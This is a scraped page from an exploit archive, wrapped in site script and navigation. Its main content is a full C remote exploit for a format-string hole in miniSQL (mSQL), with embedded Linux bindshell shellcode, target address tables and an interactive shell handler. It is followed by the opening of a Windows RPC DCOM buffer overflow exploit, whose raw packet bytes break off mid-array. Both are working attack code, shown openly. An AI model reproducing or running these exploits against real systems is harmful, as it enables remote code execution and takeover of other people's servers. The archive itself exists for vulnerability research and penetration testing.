(urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 63
miniSQL (mSQL) 1.3 - GID Remote Code Execution - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDminiSQL (mSQL) 1.3 - GID Remote Code ExecutionEDB-ID:63CVE:EDB Verified:Author:the itchType:remoteExploit:/Platform:LinuxDate:2003-07-25Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*           _ ________            _____                        ________ ___ ____       /____.------`    /_______.------.___.----`  ___/____ ________/    \ _   /\   __.  __//   ___/_    ___.  /_\    /_    |     _/___ ._\    . \\  /__  _____/ _    /     \_  |    /__      |   _| slc | _____ _- -------\______||--._____\---._______//-|__    //-.___|----._____||/ \   /\/[*] mSQL < remote gid root exploit    by lucipher & The Itch (netric)------------------------------------------------------------------------------[*]  Exploits a format string hole in mSQL.[*] Some functions are taken from mSQL's sourcecodeCopyright (c) 2003 Netric Security and lucipherAll rights reserved.THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR IMPLIEDWARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED WARRANTIES OFMERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.*/#include <stdio.h>	/* required by fatal() */#include <stdlib.h>#include <stdarg.h>	/* required by fatal() */#include <unistd.h>#include <sys/types.h>#include <sys/time.h>#include <string.h>#include <time.h>#include <fcntl.h>#include <arpa/inet.h>#include <sys/socket.h>#include <netinet/in.h>#include <netdb.h>#include <errno.h>	/* required by errno */#include <getopt.h>	/* required by getopt() */#include <signal.h>#define PKT_LEN		(128*1024)#define ERR_BUF_LEN     200#define resetError()    bzero(msqlErrMsg,sizeof(msqlErrMsg))#define chopError()     { char *cp; cp = msqlErrMsg+strlen(msqlErrMsg) -1; \if (*cp == '\n') *cp = 0;}#define NET_READ(fd,b,l)	read(fd,b,l)#define NET_WRITE(fd,b,l)	write(fd,b,l)#define SERVER_GONE_ERROR	"server has gone...\n"#define UNKNOWN_ERROR		"foo!"static char msqlErrMsg[200];static u_char packetBuf[PKT_LEN + 4];static int readTimeout;u_char *packet = NULL;int netReadPacket(int fd);int netWritePacket(int fd);/* bindshell shellcode */char linux_code[78] = /* binds on port 26112 */"\x31\xdb\xf7\xe3\x53\x43\x53""\x6a\x02\x89\xe1\xb0\x66\x52""\x50\xcd\x80\x43\x66\x53\x89""\xe1\x6a\x10\x51\x50\x89\xe1""\x52\x50\xb0\x66\xcd\x80\x89""\xe1\xb3\x04\xb0\x66\xcd\x80""\x43\xb0\x66\xcd\x80\x89\xd9""\x93\xb0\x3f\xcd\x80\x49\x79""\xf9\x52\x68\x6e\x2f\x73\x68""\x68\x2f\x2f\x62\x69\x89\xe3""\x52\x53\x89\xe1\xb0\x0b\xcd""\x80";static void intToBuf(cp, val)u_char *cp;int val;{*cp++ = (unsigned int) (val & 0x000000ff);*cp++ = (unsigned int) (val & 0x0000ff00) >> 8;*cp++ = (unsigned int) (val & 0x00ff0000) >> 16;*cp++ = (unsigned int) (val & 0xff000000) >> 24;}static int bufToInt(cp)u_char *cp;{int val;val = 0;val = *cp++;val += ((int) *cp++) << 8;val += ((int) *cp++) << 16;val += ((int) *cp++) << 24;return (val);}int netWritePacket(fd)int fd;{int len, offset, remain, numBytes;len = strlen((char *) packet);intToBuf(packetBuf, len);offset = 0;remain = len + 4;while (remain > 0) {numBytes = NET_WRITE(fd, packetBuf + offset, remain);if (numBytes == -1) {return (-1);}offset += numBytes;remain -= numBytes;}return (0);}int netReadPacket(fd)int fd;{u_char buf[4];int len, remain, offset, numBytes;remain = 4;offset = 0;numBytes = 0;readTimeout = 0;while (remain > 0) {/*** We can't just set an alarm here as on lots of boxes** both read and recv are non-interuptable.  So, we** wait till there something to read before we start** reading in the server (not the client)*/if (!readTimeout) {numBytes = NET_READ(fd, buf + offset, remain);if (numBytes < 0 && errno != EINTR) {fprintf(stderr,"Socket read on %d for length failed : ",fd);perror("");}if (numBytes <= 0)return (-1);}if (readTimeout)break;remain -= numBytes;offset += numBytes;}len = bufToInt(buf);if (len > PKT_LEN) {fprintf(stderr, "Packet too large (%d)\n", len);return (-1);}if (len < 0) {fprintf(stderr, "Malformed packet\n");return (-1);}remain = len;offset = 0;while (remain > 0) {numBytes = NET_READ(fd, packet + offset, remain);if (numBytes <= 0) {return (-1);}remain -= numBytes;offset += numBytes;}*(packet + len) = 0;return (len);}int msqlSelectDB(int sock, char *db){memset(msqlErrMsg, 0x0, sizeof(msqlErrMsg));packet = packetBuf+4;snprintf(packet, PKT_LEN, "%d:%s\n", 2, db);netWritePacket(sock);if (netReadPacket(sock) <= 0) {strcpy(msqlErrMsg, SERVER_GONE_ERROR);return (-1);}if (atoi(packet) == -1) {char *cp;cp = (char *) index(packet, ':');if (cp) {strcpy(msqlErrMsg, cp + 1);chopError();} else {strcpy(msqlErrMsg, UNKNOWN_ERROR);}return (-1);}return (0);}struct target {char *name;			/* target description */unsigned long writeaddr;	/* mSQL's errMsg + 18 + 8 address */unsigned long smashaddr;	/* strcpy's GOT address */unsigned long pops;		/* number of stack pops */};/* high and low words indexers */enum { hi, lo };/* default values. */struct target targets[] = {/* name                         write      smash       pops */{ "SlackWare 8.1 - mSQL 3.0p1", 0x80a169a, 0x080751ec, 113 },{ "Debian 3.0 - mSQL 3.0p1", 134879034, 0x08075224, 113 },{ "RedHat 8.0 - mSQL 3.0p1", 0x804b778, 0x08074c1c, 115 },{ "RedHat 8.0 (II) - mSQL 3.0p1", 0x804b778, 0x08074c1c, 116 },{ NULL, 0x0, 0x0, 0 }};void fatal(char *fmt, ...){char buffer[1024];va_list ap;va_start(ap, fmt);vsnprintf(buffer, sizeof (buffer) - 1, fmt, ap);va_end(ap);fprintf(stderr, "%s", buffer);exit(1);}/* resolve a given hostname */unsigned long tcp_resolv(char *hostname){struct hostent *he;unsigned long addr;int n;he = gethostbyname(hostname);if (he == NULL) {n = inet_aton(hostname, (struct in_addr *) addr);if (n < 0)fatal("inet_aton: %s\n", strerror(errno));return addr;}return *(unsigned long *) he->h_addr;}/* routine to open a tcp/ip connection */int tcp_connect(char *hostname, int port){struct sockaddr_in sin;int fd, n;sin.sin_addr.s_addr = tcp_resolv(hostname);sin.sin_family = AF_INET;sin.sin_port = htons(port);fd = socket(AF_INET, SOCK_STREAM, 6);if (fd < 0)return -1;n = connect(fd, (struct sockaddr *) &sin, sizeof (sin));if (n < 0)return -1;return fd;}int msql_login(char *hostname, unsigned short int port){char buffer[300], *p;int fd, n, opt;fd = tcp_connect(hostname, port);if (fd < 0)fatal("[-] couldn't connect to host %s:%u\n", hostname, port);setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, (char *) &opt, 4);memset(&buffer, 0x0, sizeof(buffer));n = read(fd, &buffer, sizeof(buffer) - 1);if (n < 0)fatal("[-] could not read socket: %s\n", strerror(errno));p = (char *)&buffer + 4;if (atoi(p) == -1)fatal("[-] bad handshake received.\n");p++;if (*p != ':') p++;p++;if (*p >= '1' && *p <= '3') {/* send buffer size within packet. */buffer[0] = (unsigned int) (5UL & 0x000000ff);buffer[1] = (unsigned int) (5UL & 0x0000ff00) >> 8;buffer[2] = (unsigned int) (5UL & 0x00ff0000) >> 16;buffer[3] = (unsigned int) (5UL & 0xff000000) >> 24;/* sorta like our login. */buffer[4] = 'r';buffer[5] = 'o';buffer[6] = 'o';buffer[7] = 't';buffer[8] = '\n';buffer[9] = '\0';write(fd, buffer, 9);}n = read(fd, buffer, sizeof(buffer) - 1);if (n < 0)fatal("[-] client failed in handshake.\n");printf("[+] connected to %s -> %u\n", hostname, port);return fd;}void msql_selectdb(int fd, char *database){unsigned char buffer[300];unsigned int len;len = 117;buffer[0] = (unsigned char)(len & 0x000000ff);buffer[1] = (unsigned char)(len & 0x0000ff00) >> 8;buffer[2] = (unsigned char)(len & 0x00ff0000) >> 16;buffer[3] = (unsigned char)(len & 0xff000000) >> 24;snprintf(&buffer[4], sizeof(buffer) - 1, "2:%s\n", database);len = write(fd, &buffer[0], len);}void shell(int fd){char buf[512];fd_set rfds;int l;write(fd, "id ; uname -a\n", 14);while (1) {FD_SET(0, &rfds);FD_SET(fd, &rfds);select(fd + 1, &rfds, NULL, NULL, NULL);if (FD_ISSET(0, &rfds)) {l = read(0, buf, sizeof (buf));if (l <= 0) {perror("read user");exit(EXIT_FAILURE);}write(fd, buf, l);}if (FD_ISSET(fd, &rfds)) {l = read(fd, buf, sizeof (buf));if (l == 0) {fatal("connection closed by foreign host.\n");} else if (l < 0) {perror("read remote");exit (EXIT_FAILURE);}write(1, buf, l);}}}void usage(void){fprintf(stderr, "mSQLexploit\n\n");fprintf(stderr, "  -l\t\tlist available targets.\n");fprintf(stderr, "  -t target\ttarget selection.\n");fprintf(stderr, " *** MANUAL ATTACK ***\n");fprintf(stderr, "  -s [addr]\tsmash address.\n");fprintf(stderr, "  -w [addr]\twrite address.\n");fprintf(stderr, "  -p [num]\tnumber of pops.\n");exit(1);}int main(int argc, char **argv){struct target manual;struct target *target = NULL;unsigned short port = 0, addr[2];unsigned char split[4];char *hostname, buffer[200];int fd, opt;if (argc <= 1)usage();memset(&manual, 0x00, sizeof(struct target));while ((opt = getopt(argc, argv, "lht:s:w:p:")) != EOF) {switch (opt) {case 't': /* pre-written target selection */target = &targets[atoi(optarg)];break;case 'l':{int i;/* iterate through the list of targets and display. */for (i = 0; targets[i].name; i++)printf("[%d] %s\n", i, targets[i].name);exit(1);}case 'h':/* print exploit usage information */usage();break; /* never reached */case 's':if (target == NULL)target = &manual;target->name = "Manual Target";target->smashaddr = strtoul(optarg, NULL, 16);break;case 'w':if (target == NULL)target = &manual;target->name = "Manual Target";target->writeaddr = strtoul(optarg, NULL, 16) + 0x1a;break;case 'p':if (target == NULL)target = &manual;target->name = "Manual Target";target->pops = atoi(optarg);}}argc -= optind;argv += optind;if (argc <= 0) {fatal("choose a hostname and optionally a port\n");} else if (argc == 1) {hostname = argv[0];} else {hostname = argv[0];port = atoi(argv[1]) & 0xff;}if (target != NULL) {if (!strncmp(target->name, "Manual", 6))if (!target->smashaddr || !target->writeaddr ||!target->pops)fatal("exploit requires pop count and ""smash, write addresses: use -p and -w and -s ""to set them\n");} else {target = &target[0];}printf("[+] attacking %s -> %u\n", hostname, (port) ? port : 1114);fd = msql_login(hostname, (port) ? port : 1114);printf("[+] name %s\n", target->name);printf("[+] smash %08lx\n", target->smashaddr);printf("[+] write %08lx\n", target->writeaddr);printf("[+] Now building string...\n");memset(&buffer, 0x0, sizeof(buffer));addr[lo] = (target->writeaddr & 0x0000ffff);addr[hi] = (target->writeaddr & 0xffff0000) >> 16;/* split the address */split[0] = (target->smashaddr & 0xff000000) >> 24;split[1] = (target->smashaddr & 0x00ff0000) >> 16;split[2] = (target->smashaddr & 0x0000ff00) >> 8;split[3] = (target->smashaddr & 0x000000ff);/* build the format string */if (addr[hi] < addr[lo])snprintf(buffer, sizeof(buffer),"%c%c%c%c""%c%c%c%c""%s""%%.%du%%%ld$hn""%%.%du%%%ld$hn",split[3] + 2, split[2], split[1], split[0],split[3], split[2], split[1], split[0],linux_code,addr[hi] - 0x68, target->pops,addr[lo] - addr[hi], target->pops + 1);elsesnprintf(buffer, sizeof(buffer),"%c%c%c%c""%c%c%c%c""%s""%%.%du%%%ld$hn""%%.%du%%%ld$hn",split[3] + 2, split[2], split[1], split[0],split[3], split[2], split[1], split[0],linux_code,addr[lo] - 0x68, target->pops,addr[hi] - addr[lo], target->pops + 1);printf("[+] Trying to exploit...\n");msqlSelectDB(fd, buffer);switch (opt = fork()) {case 0:msqlSelectDB(fd, buffer);exit(1);case -1:fatal("[-] failed fork()!\n");default:break;}printf("[+] sleeping...\n");sleep(1);opt = tcp_connect(hostname, 26112);if (opt < 0)fatal("[-] failed! couldn't connect to bindshell!\n");printf("[+] shell!\n");shell(opt);return 0;}// milw0rm.com [2003-07-25]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 64
Microsoft Windows - 'RPC DCOM' Remote Buffer Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows - 'RPC DCOM' Remote Buffer OverflowEDB-ID:64CVE:2003-0605EDB Verified:Author:FlashskyType:remoteExploit:/Platform:WindowsDate:2003-07-25Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#include <stdio.h>#include <winsock2.h>#include <windows.h>#include <process.h>#include <string.h>#include <winbase.h>#pragma  comment(lib,"ws2_32")unsigned char bindstr[]={0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};unsigned char request1[]={0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03,0x00,0x00,0xE5,0x00,0x00,0x00,0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45,0x64,0x49,0xB0,0x70,0xDD,0xAE,0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E,0x0D,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D,0xCE,0x11,0xA6,0x6A,0x00,0x20,0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41,0x52,0x42,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0xA8,0xF4,0x0B,0x00,0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29,0xCD,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA4,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x58,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x78,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09,0x02,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x78,0x19,0x0C,0x00,0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x70,0xD8,0x98,0x93,0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00,0x00,0x00,0x32,0x00,0x31,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0